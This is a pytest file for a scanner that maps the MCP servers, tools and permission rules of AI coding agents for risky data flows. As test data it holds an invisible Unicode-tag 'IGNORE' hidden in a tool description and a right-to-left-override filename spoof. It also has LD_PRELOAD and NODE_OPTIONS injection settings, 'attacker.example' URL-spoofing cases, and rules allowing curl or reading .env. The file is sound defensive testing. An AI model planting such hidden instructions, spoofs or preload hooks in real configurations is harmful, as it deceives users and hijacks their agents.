    "token=${TOKEN}", "password: $DB_PASSWORD", "api_key: <YOUR_KEY>", "secret=changeme", "password: none", "pass: true",
    "max_tokens=4096", "Bash(gh auth token:*)", "Bash(npm run token:refresh)", "mcp/secret:latest", "tokens are rotated daily",
    "--password ${DB_PASSWORD}", "Authorization: Bearer ${API_TOKEN}", "Authorization:${AUTH_HEADER}", "passwords are hashed",
])
def test_scrub_leaves_references_placeholders_and_ordinary_text_alone(text):
    assert scan.scrub(text) == text


def test_invisible_and_direction_changing_characters_are_made_visible(dirs):
    hidden = ("\u202e", "\u2066", "\u2069", "\u200b", "\u200d", "\u2028", "\ufeff", "\u00ad", "\U000e0041", "\ufe0f", "\x9b")
    for ch in hidden:
        assert scan.scrub(f"safe{ch}text") == "safe?text", repr(ch)
        assert scan.printable(f"safe{ch}text") == "safe?text", repr(ch)
    assert scan.scrub("naïve café — 日本語 ünïcödé") == "naïve café — 日本語 ünïcödé", "ordinary non-ASCII text is untouched"
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {
        "notes\u202egnp.exe": {"command": "node", "args": ["x.js", "--label=a\u200bb"]},
        "fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    listed = [{"name": "ok_tool", "description": "Reads the inbox.\U000e0049\U000e0047\U000e004e\U000e004f\U000e0052\U000e0045 hidden"}]
    with Store(":memory:") as store:
        result = do_scan(store, home, project, introspected={"claude-code/notes?gnp.exe": listed})
        texts = (scan.render_scan(result, None), scan.render_tools(scan.list_tools(store)), graph_text(store))
        for text in texts:
            assert not any(ch in text for ch in hidden)
        assert "notes?gnp.exe" in servers(store)
        assert tool(store, "mcp__notes_gnp_exe__ok_tool")["description"] == "Reads the inbox.?????? hidden"


def test_a_long_text_is_never_cut_through_the_middle_of_a_token():
    """Only the first part of a long text is looked at. A token the cut goes through must not leave its head behind:
    eight to nineteen characters of it are too short to be recognised as a token, and long enough to matter."""
    token = CANARIES["random argument"]
    blob = ("Qm7Rk2Vx9Lp4Tz8Wc3Yb6Nd1Hf5Jg0Ks" * 7)[:200]       # redacted to one word, so the tail of the text is printed
    for lead in range(2382, 2400):
        text = (blob + " ") * 11 + "x" * (lead - 11 * 201) + " " + token
        assert len(text) > 2400 and text[:2400].endswith(" " + token[: 2400 - lead - 1])
        out = scan.scrub(text)
        assert len(out) < 600 and token[:8] not in out, f"the head of a token survived a cut at {lead}"


# -- review: tools a person declares ------------------------------------------------------------------------------


def test_a_tool_declared_by_hand_belongs_to_its_server_from_the_next_scan_on(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"mystery": {"command": "node", "args": ["server.js"]}}})
    write(project / ".claude" / "settings.json", settings(allow=["mcp__mystery"]))
    with Store(":memory:") as store:
        from tainttrail import paths

        result = do_scan(store, home, project)
        assert any("server mystery: no tools are known" in w for w in result.warnings)
        changed = scan.set_tool_labels(store, "mcp__mystery__send_all", {"external_sink": True, "sink_scope": "public"})
        assert changed["created"] is True
        scan.set_tool_labels(store, "mcp__elsewhere__send", {"external_sink": True})

        for include_observed in (True, False):      # a declared tool is not "only seen in sessions"
            result = do_scan(store, home, project, include_observed=include_observed)
            assert tools_of(store, "claude-code/mystery") == {"mcp__mystery__send_all"}
            sent = tool(store, "mcp__mystery__send_all")
            assert (sent["origin"], sent["label_source"], sent["gate"], sent["permission_rule"]) == \
                ("user", "user", "open", "mcp__mystery")
            assert not any("server mystery: no tools are known" in w for w in result.warnings)
            assert any(p.sink == "mcp__mystery__send_all" for p in paths.find_paths(store, limit=500).paths)
            # A tool declared for a server that nothing configures stays on its own, and is kept.
            assert "elsewhere" not in servers(store) and tool(store, "mcp__elsewhere__send")["label_source"] == "user"

        # Taking the label back takes the declaration back: nothing else knows the tool, so the next scan drops it.
        scan.reset_tool_labels(store, "mcp__mystery__send_all")
        do_scan(store, home, project)
        assert tool(store, "mcp__mystery__send_all") is None and tools_of(store, "claude-code/mystery") == set()


def test_resetting_a_label_gives_back_what_a_scan_would_compute(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"gh": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"]}}})
    write(project / ".cursor" / "mcp.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    with Store(":memory:") as store:
        from tainttrail import paths

        do_scan(store, home, project)
        before = {name: tool(store, name, agent) for name, agent in (("mcp__gh__create_issue", "claude-code"), ("Shell", "cursor"))}
        cursor_paths = paths.find_paths(store, agent="cursor").total
        scan.set_tool_labels(store, "mcp__gh__create_issue", {"external_sink": False})
        scan.set_tool_labels(store, "Shell", {"external_sink": False, "private_data": False}, agent="cursor")
        assert paths.find_paths(store, agent="cursor").total < cursor_paths
        scan.reset_tool_labels(store, "mcp__gh__create_issue")      # the server is called "gh": only its package says GitHub
        scan.reset_tool_labels(store, "Shell", agent="cursor")      # a built-in of Cursor, unknown to the Claude Code table
        for name, agent in (("mcp__gh__create_issue", "claude-code"), ("Shell", "cursor")):
            after = tool(store, name, agent)
            for key in ("untrusted_input", "private_data", "external_sink", "local_write", "code_exec", "label_source",
                        "label_confidence", "sink_scope"):
                assert after[key] == before[name][key], (name, key)
        assert paths.find_paths(store, agent="cursor").total == cursor_paths, "no scan was needed to get the paths back"


# -- review: asking a server that does not behave ------------------------------------------------------------------


HANDSHAKE = textwrap.dedent('''
    import json, os, sys
    open(os.environ["MARK"], "w").write(str(os.getpid()))
    def answer(msg, result):
        print(json.dumps({"jsonrpc": "2.0", "id": msg["id"], "result": result}), flush=True)
''')


def server_entry(tmp_path: Path, body: str, *, handshake: bool = False) -> ServerEntry:
    """A server entry that runs ``body`` as a Python script (after the helper above, when asked)."""
    script = write(tmp_path / "odd_server.py", text=(HANDSHAKE if handshake else "") + textwrap.dedent(body))
    return ServerEntry("claude-code", "odd", "project", str(tmp_path / ".mcp.json"), argv=[sys.executable, str(script)],
                       env={"MARK": str(tmp_path / "started")})


def test_a_server_that_leaves_a_child_holding_its_output_cannot_hang_the_scan(tmp_path):
    import os
    import time

    entry = server_entry(tmp_path, '''
        import os, subprocess, sys, time
        child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"], start_new_session=True)
        open(os.environ["MARK"], "w").write(f"{os.getpid()} {child.pid}")
        time.sleep(30)
    ''')
    started = time.monotonic()
    try:
        with pytest.raises(scan.IntrospectError, match="no answer within"):
            scan.introspect_server(entry, timeout=2)
        assert time.monotonic() - started < 10, "the time limit holds although something still has the pipe open"
    finally:
        server_pid, child_pid = (int(p) for p in (tmp_path / "started").read_text().split())
        try:
            os.kill(child_pid, 9)       # it left our process group on purpose; tidy up after the test
        except ProcessLookupError:
            pass
    with pytest.raises(ProcessLookupError):
        os.kill(server_pid, 0)


def test_a_server_that_floods_its_output_is_stopped_and_little_of_it_is_kept(tmp_path, monkeypatch):
    import time
    import tracemalloc

    monkeypatch.setattr(scan, "MAX_SERVER_BACKLOG", 200_000)
    entry = server_entry(tmp_path, '''
        import os, sys
        open(os.environ["MARK"], "w").write(str(os.getpid()))
        line = ("x" * 4000 + "\\n").encode()
        while True:
            os.write(1, line * 16)
    ''')
    tracemalloc.start()
    started = time.monotonic()
    with pytest.raises(scan.IntrospectError, match="no answer within"):
        scan.introspect_server(entry, timeout=1.5)
    took, (_now, peak) = time.monotonic() - started, tracemalloc.get_traced_memory()
    tracemalloc.stop()
    assert took < 10 and peak < 40_000_000, f"{took:.1f} s, {peak / 1e6:.0f} MB"


def test_a_server_cannot_make_the_scan_write_without_end(tmp_path):
    import time

    entry = server_entry(tmp_path, '''
        answer({"id": 1}, {})
        page = 2
        while True:         # never reads its input; answers every page in advance with a huge cursor
            answer({"id": page}, {"tools": [{"name": f"t{page}"}], "nextCursor": "c" * 200000})
            page += 1
            if page > 60:
                import time; time.sleep(30)
    ''', handshake=True)
    started = time.monotonic()
    listed = scan.introspect_server(entry, timeout=5)
    assert [t["name"] for t in listed] == ["t2"], "an oversized cursor is not sent back; the listing stops there"
    assert time.monotonic() - started < 10


def test_a_tool_list_of_the_wrong_shape_is_an_empty_one(tmp_path):
    entry = server_entry(tmp_path, '''
        for line in sys.stdin:
            msg = json.loads(line)
            if msg.get("method") == "initialize":
                answer(msg, {})
            elif msg.get("method") == "tools/list":
                answer(msg, {"tools": "all of them", "nextCursor": 7})
    ''', handshake=True)
    assert scan.introspect_server(entry, timeout=20) == []


@pytest.mark.parametrize("schema", [
    {"properties": ["to", "body"]}, {"properties": "to"}, {"properties": 7}, ["properties"], "object",
    {"properties": {"to": 1, "body": [2]}}, {"properties": {"x" * 5000: {}}},
])
def test_a_tool_schema_of_the_wrong_shape_cannot_break_a_scan(dirs, schema):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"reports": {"command": "node", "args": ["x.js"]}}})
    listed = [{"name": "send_report", "inputSchema": schema, "description": ["not", "text"]},
              {"name": "get_weather", "inputSchema": {"properties": {"city": {}}}, "description": 7}]
    with Store(":memory:") as store:
        do_scan(store, home, project, introspected={"claude-code/reports": listed})
        assert tools_of(store, "claude-code/reports") == {"mcp__reports__send_report", "mcp__reports__get_weather"}
        assert tool(store, "mcp__reports__send_report")["external_sink"] is True, "the name still says what it does"
        assert tool(store, "mcp__reports__get_weather")["description"] == ""


def test_stopping_a_server_works_where_there_are_no_process_groups(tmp_path, monkeypatch):
    import os
    import signal

    def no_groups(pid, sig):
        raise AttributeError("os.killpg is not available on this platform")

    monkeypatch.setattr(os, "killpg", no_groups)
    monkeypatch.delattr(signal, "SIGKILL")
    entry = server_entry(tmp_path, '''
        import os, time
        open(os.environ["MARK"], "w").write(str(os.getpid()))
        time.sleep(30)
    ''')
    with pytest.raises(scan.IntrospectError, match="no answer within"):
        scan.introspect_server(entry, timeout=1)
    with pytest.raises(ProcessLookupError):
        os.kill(int((tmp_path / "started").read_text()), 0)


@pytest.mark.parametrize("value", ["inf", "nan", "-5", "0", "100000"])
def test_a_timeout_that_is_not_a_time_is_refused_before_anything_starts(dirs, cfg, tmp_path, capsys, value):
    home, project = dirs
    marker = fake_server(tmp_path, project)
    assert scan_cli(cfg, home, project, "--introspect", "--yes", "--timeout", value) == 2
    assert "--timeout takes a number of seconds" in capsys.readouterr().err and not marker.exists()


def test_the_list_of_commands_to_start_shows_what_a_person_needs_to_judge_them(dirs, cfg, capsys):
    home, project = dirs
    long_tail = "x" * 900 + " --then-the-part-that-matters"
    write(project / ".mcp.json", {"mcpServers": {
        "plain": {"command": "node", "args": ["server.js"]},
        "preloaded": {"command": "node", "args": ["server.js", long_tail],
                      "env": {"NODE_OPTIONS": "--require ./x.js", "LD_PRELOAD": "/tmp/x.so", "API\x1b[2K": "1"}},
        "keyed": {"command": "node", "args": ["server.js", "--api-key", CANARIES["flag value"]]},
    }})
    assert scan_cli(cfg, home, project, "--introspect") == 2
    err = capsys.readouterr().err
    lines = {line.split(":")[0].strip(): line for line in err.splitlines() if line.startswith("  claude-code/")}
    assert lines["claude-code/plain"].strip() == "claude-code/plain: node server.js"
    assert "--then-the-part-that-matters" in lines["claude-code/preloaded"], "a long command is shown, not cut at 600"
    assert "[sets API?[2K, LD_PRELOAD, NODE_OPTIONS]" in lines["claude-code/preloaded"]
    assert CANARIES["flag value"] not in err and "\x1b" not in err
    assert f"read {project / '.mcp.json'}" in lines["claude-code/keyed"], "what was hidden can be read in the file"


# -- review: sizes ----------------------------------------------------------------------------------------------------


def test_fifty_thousand_rules_do_not_make_the_scan_crawl(dirs):
    import time

    home, project = dirs
    claude_trio(home, project)
    many = [f"mcp__server{i}__tool{i % 7}" for i in range(20_000)] + [f"mcp__fetch__f{i}*" for i in range(10_000)]
    write(project / ".claude" / "settings.json", {"permissions": {
        "allow": many + ["mcp__slack__slack_post_message"], "ask": [f"Bash(deploy step{i}:*)" for i in range(10_000)],
        "deny": [f"x{i}*" for i in range(10_000)] + ["mcp__fetch__fetch"]}})
    with Store(":memory:") as store:
        started = time.monotonic()
        do_scan(store, home, project)
        assert time.monotonic() - started < 5, "rules are looked up from the tool's side, not tried one by one"
        assert tool(store, "mcp__slack__slack_post_message")["permission"] == "allow"
        assert tool(store, "mcp__fetch__fetch")["permission"] == "deny"
        assert len(tool(store, "Bash")["permission_partial"]) == scan.MAX_PARTIAL_RULES


def test_rules_in_any_number_keep_their_order_and_meaning():
    """The index behind the rules must not change which rule wins."""
    import random

    rng = random.Random(20261114)
    names = ["Bash", "Read", "Grep", "Write", "WebFetch", "Agent", "mcp__github__get_issue", "mcp__github__create_issue",
             "mcp__git__status"]
    specs = [ToolSpec("claude-code", n, *((n.split("__")[1], n.split("__")[2], n.split("__")[1]) if n.startswith("mcp__") else ()))
             for n in names]
    texts = ["Bash", "Bash(curl:*)", "Bash(*)", "Read", "Read(./.env)", "Edit", "Edit(src/**)", "Task", "WebFetch(domain:*)",
             "mcp__github", "mcp__github__*", "mcp__github__get_*", "mcp__git", "mcp__*", "*", "B*", "mcp__git*", "W*",
             "mcp__github__create_issue", "mcp__github(x)", "*Fetch", "Grep(x)", "Agent(Explore)"]

    def slow(tool, rule_list):          # every rule tried on the tool, in order: the definition
        result = None
        for kind in ("deny", "ask", "allow"):
            for rule in rule_list:
                name, spec = scan.parse_rule(rule.text)
                if rule.kind == kind and result is None and scan._match_claude(kind, name, spec, tool) == "full":
                    result = (kind, rule.text)
        return result or ("default", "")

    for _ in range(300):
        rule_list = [PermissionRule(rng.choice(("allow", "ask", "deny")), rng.choice(texts), "f", "project")
                     for _ in range(rng.randint(0, 12))]
        ruleset = scan.RuleSet(rule_list)
        for tool_spec in specs:
            found = ruleset.evaluate(tool_spec)
            assert (found.permission, found.rule) == slow(tool_spec, rule_list), (tool_spec.name, [(r.kind, r.text) for r in rule_list])


def test_rules_that_were_not_read_are_reported_never_dropped_in_silence(dirs):
    home, project = dirs
    claude_github(home, project, allow=["Bash(" + "curl " * 500 + ")", "mcp__github__get_me"],
                  deny=[f"*x{i}" for i in range(scan.MAX_UNANCHORED_RULES + 3)])
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        assert any("1 permission rules longer than 2000 characters were not read" in p for p in result.problems)
        assert any("3 of them were not read" in p for p in result.problems)
        assert tool(store, "mcp__github__get_me")["permission"] == "allow", "the rules that were read still apply"


def test_more_allowed_command_patterns_than_can_be_checked_count_as_an_open_shell(dirs, monkeypatch):
    home, project = dirs
    monkeypatch.setattr(scan, "MAX_SHELL_PATTERNS", 50)
    claude_github(home, project, allow=[f"Bash(npm run task{i}:*)" for i in range(50)])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert tool(store, "Bash")["gate"] == "ask", "fifty harmless patterns were all looked at"
    claude_github(home, project, allow=[f"Bash(npm run task{i}:*)" for i in range(60)] + ["Bash(curl:*)"])
    with Store(":memory:") as store:
        do_scan(store, home, project)
        bash = tool(store, "Bash")
        assert bash["gate"] == "open" and "too many to check" in bash["gate_reason"] and bash["open_partial"] == []


def test_a_scan_the_graph_engine_refuses_ends_with_one_line_and_the_old_map(dirs, cfg, capsys, monkeypatch):
    import relate

    home, project = dirs
    claude_trio(home, project)
    assert scan_cli(cfg, home, project, "--json") == 0
    capsys.readouterr()
    with Store(cfg.db_path) as store:
        before = graph_text(store)

    def too_large(store, *args, **kwargs):
        store.write("MATCH (s:Server) DETACH DELETE s")     # part of the work is done when the engine gives up
        raise relate.DataError("This statement tried to commit a single WAL record of at least 64 MB.\nsecond line")

    monkeypatch.setattr(scan, "_replace_agent", too_large)
    assert scan_cli(cfg, home, project) == 1
    err = capsys.readouterr().err
    assert "the graph engine refused the scan (This statement tried to commit" in err and "second line" not in err
    assert "Traceback" not in err and "previous scan was kept" in err
    with Store(cfg.db_path) as store:
        assert graph_text(store) == before


def test_cursor_cli_permissions_are_also_read_from_the_xdg_config_directory(dirs):
    home, project = dirs
    write(project / ".cursor" / "mcp.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    write(home / ".config" / "cursor" / "cli-config.json", {"permissions": {"allow": ["Mcp(fetch:*)"]}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert tool(store, "mcp__fetch__fetch", "cursor")["permission"] == "allow"


def test_a_file_with_absurd_numbers_of_things_is_read_up_to_a_limit_and_reported(dirs, monkeypatch):
    import time

    home, project = dirs
    monkeypatch.setattr(scan, "MAX_SERVERS_PER_FILE", 30)
    monkeypatch.setattr(scan, "MAX_RULES", 500)
    servers_ = {f"s{i:04d}": {"command": "node", "args": ["x.js"]} for i in range(200)}
    servers_["s0000"] = {
        "command": "node", "args": ["x.js", *(f"--flag{i}=v" for i in range(5000)), "--token", CANARIES["flag value"]],
        "env": {**{f"VAR_{i}": "${REF_" + str(i) + "}" for i in range(400)}, "MANY": " ".join("${R%d}" % i for i in range(20000))},
        "headers": {f"X-Key-{i}": "Bearer ${T}" for i in range(300)},
    }
    servers_["s0001"] = {"type": "http", "url": "https://x.test/" + "/".join(f"seg{i}" for i in range(200_000)) + "?token=" + CANARIES["url query"]}
    servers_.update({f"junk{i}": "not an object" for i in range(500)})
    write(project / ".mcp.json", {"mcpServers": servers_})
    write(project / ".claude" / "settings.json", settings(allow=[f"mcp__s0000__t{i}" for i in range(2000)], deny=["WebFetch"]))
    with Store(":memory:") as store:
        started = time.monotonic()
        result = do_scan(store, home, project)
        assert time.monotonic() - started < 20
        assert len(servers(store)) == 31, "thirty servers and the built-in tools"
        assert any("more than 30 MCP servers; the rest were not read" in p for p in result.problems)
        assert any("more than 500 permission rules; the rest were not read" in p for p in result.problems)
        assert sum("is not an object" in p for p in result.problems) <= 20
        assert tool(store, "WebFetch")["permission"] == "deny", "deny rules come first and were read"
        assert store.scalar("MATCH (:Server {id: 'claude-code/s0000'})-[:HOLDS]->(c:Credential) RETURN count(c)") == scan.MAX_CREDENTIALS
        command = servers(store)["s0000"]["command"]
        assert len(command) <= 600 and command.startswith("node x.js --flag0=v")
        url = servers(store)["s0001"]["url"]
        assert len(url) <= 300 and url.startswith("https://x.test/seg0/seg1")
        for text in (graph_text(store), json.dumps(result.to_dict()), scan.render_scan(result, None)):
            assert CANARIES["flag value"] not in text and CANARIES["url query"] not in text
        assert "more arguments" in scan.redact_argv(["node", *("x" for _ in range(scan.MAX_ARGUMENTS + 7))], 100_000)


# -- review: allowlists, and servers the scan cannot see -------------------------------------------------------------


@pytest.mark.parametrize("pattern,url,matches", [
    ("https://mcp.example.test/*", "https://mcp.example.test/api", True),
    ("https://mcp.example.test", "https://mcp.example.test/api/v1?x=1", True),         # no path: every path
    ("https://mcp.example.test/*", "https://mcp.example.test", True),
    ("https://Mcp.Example.test/*", "https://mcp.example.test./api", True),             # case and a trailing dot
    ("https://mcp.example.test/*", "https://mcp.example.test:8443/api", False),        # default port only
    ("https://mcp.example.test:8443/*", "https://mcp.example.test:8443/api", True),
    ("https://mcp.example.test:*/*", "https://mcp.example.test:8443/api", True),
    ("https://*.example.test/*", "https://mcp.example.test:8443/api", True),           # a wildcard host: every port
    ("https://*.example.test/*", "https://example.test.attacker.example/api", False),
    ("*://mcp.example.test/*", "http://mcp.example.test/api", True),
    ("https://mcp.example.test/api/*", "https://mcp.example.test/other", False),
    ("https://mcp.example.test/*", "https://attacker.example\\@mcp.example.test/api", False),
    ("http://localhost:*/*", "http://localhost:3000/mcp", True),
])
def test_server_url_entries_match_the_way_claude_code_documents(pattern, url, matches):
    assert scan.server_url_matches(pattern, url) is matches


def test_an_allowlist_does_not_switch_off_what_it_allows_or_what_skips_it(dirs, tmp_path):
    home, project = dirs
    system = tmp_path / "etc-claude-code"
    write(project / ".mcp.json", {"mcpServers": {
        "listed": {"type": "http", "url": "https://mcp.example.test/api/v1"},
        "other": {"type": "http", "url": "https://other.example.test/mcp"}}})
    write(home / ".claude" / "settings.json", {"allowedMcpServers": [{"serverUrl": "https://mcp.example.test"}]})
    write(system / "managed-settings.json", {"managedMcpServers": {"corp": {"type": "http", "url": "https://corp.example.test/mcp"}}})
    [cfg] = scan.discover(home, project, system=system, agents=["claude-code"])
    state = {s.name: (s.enabled, s.status) for s in cfg.servers}
    assert state["listed"][0] is True, "a pattern without a path allows every path on that host"
    assert state["other"] == (False, "not in allowedMcpServers")
    assert state["corp"][0] is True, "servers the organisation provides need no allowlist entry"


def test_allow_rules_for_servers_nobody_declared_are_pointed_out(dirs, cfg, store):
    home, project = dirs
    claude_github(home, project, allow=["mcp__github__get_me", "mcp__plugin_notes_vault", "mcp__claude_ai_Slack__post",
                                        "mcp__plugin_notes_vault__read_secret", "mcp__*", "Bash(npm test)"])
    data = json.loads((project / ".claude" / "settings.json").read_text())
    data.update(enabledPlugins={"notes@acme-tools": True, "off@acme-tools": False},
                extraKnownMarketplaces={"acme-tools": {"source": {"source": "github", "repo": "acme/tools"}}})
    write(project / ".claude" / "settings.json", data)

    def unknown_servers() -> str:
        result = do_scan(store, home, project)
        [warning] = [w for w in result.warnings if "no scanned file declares" in w]
        assert "no scanned file declares" in scan.render_scan(result, None)
        notes = " ".join(result.agents[0]["notes"])
        assert "enables 1 plugins (notes@acme-tools)" in notes and "MCP servers and hooks that a scan does not read" in notes
        return warning.split("declares:")[1].split(". If")[0]

    named = unknown_servers()
    assert "plugin_notes_vault (mcp__plugin_notes_vault in" in named and "claude_ai_Slack" in named
    assert "github" not in named, "a declared server is not reported"
    # Once a recorded session has used the plugin's server it is on the map, and no longer unknown.
    record_call(store, cfg, "mcp__plugin_notes_vault__read_secret")
    named = unknown_servers()
    assert "plugin_notes_vault" not in named and "claude_ai_Slack" in named
    assert tool(store, "mcp__plugin_notes_vault__read_secret")["gate"] == "open"


def test_scans_and_readers_running_at_once_leave_one_consistent_map(dirs, cfg):
    """Each command is its own process and the graph admits one opener at a time: they queue, and never corrupt."""
    import os
    import subprocess

    home, project = dirs
    claude_trio(home, project, allow=["mcp__slack", "mcp__fetch"])
    env = {**os.environ, "TAINTTRAIL_HOME": str(cfg.home), "TAINTTRAIL_KEY": "test-key-not-a-secret", "NO_COLOR": "1"}
    base = [sys.executable, "-m", "tainttrail", "--project", str(cfg.root)]
    scan_cmd = [*base, "scan", "--home", str(home), "--path", str(project), "--json"]
    assert subprocess.run(scan_cmd, env=env, capture_output=True, text=True, timeout=120).returncode == 0
    commands = [scan_cmd, [*base, "paths", "--json"], scan_cmd, [*base, "tools", "--json"], [*base, "fix", "--json"]]
    running = [subprocess.Popen(c, env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) for c in commands]
    finished = 0
    for command, proc in zip(commands, running):
        out, err = proc.communicate(timeout=180)
        assert "Traceback" not in err, err[-600:]
        if proc.returncode == 0:
            json.loads(out)
            finished += 1
        else:       # on a loaded machine a command may give up waiting for its turn: it says so, and changes nothing
            assert proc.returncode == 1 and ("busy" in err or "held by another process" in err), (command[5], err[-400:])
    assert finished >= 1
    with Store(cfg.db_path) as store:
        assert set(servers(store)) == {"builtin", "fetch", "filesystem", "slack"}
        tools = store.scalar("MATCH (t:Tool) RETURN count(t)")
        assert store.scalar("MATCH (:Server)-[p:PROVIDES]->(:Tool) RETURN count(p)") == tools > 30
        assert store.scalar("MATCH (a:Agent {id: 'claude-code'}) RETURN count(a)") == 1
        assert store.scalar("MATCH (c:Credential) RETURN count(c)") == 2


def test_a_declared_tool_is_attached_under_the_name_its_agent_gives_it(dirs):
    """Gemini CLI spells MCP tools mcp_<server>_<tool>; a hand-declared one must still find its server."""
    home, project = dirs
    write(project / ".gemini" / "settings.json", {
        "mcpServers": {"notes": {"command": "node", "args": ["notes.js"]}, "notes_archive": {"command": "node", "args": ["a.js"]}},
        "tools": {"allowed": ["mcp_notes_archive_export"]}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        for name in ("mcp_notes_send", "mcp_notes_archive_export", "custom_builtin"):
            scan.set_tool_labels(store, name, {"external_sink": True}, agent="gemini-cli")
        do_scan(store, home, project)
        assert tools_of(store, "gemini-cli/notes") == {"mcp_notes_send"}
        assert tools_of(store, "gemini-cli/notes_archive") == {"mcp_notes_archive_export"}, "the longest server name wins"
        assert "custom_builtin" in tools_of(store, "gemini-cli/builtin")
        export = tool(store, "mcp_notes_archive_export", "gemini-cli")
        assert (export["origin"], export["permission"], export["gate"], export["tool"]) == ("user", "allow", "open", "export")
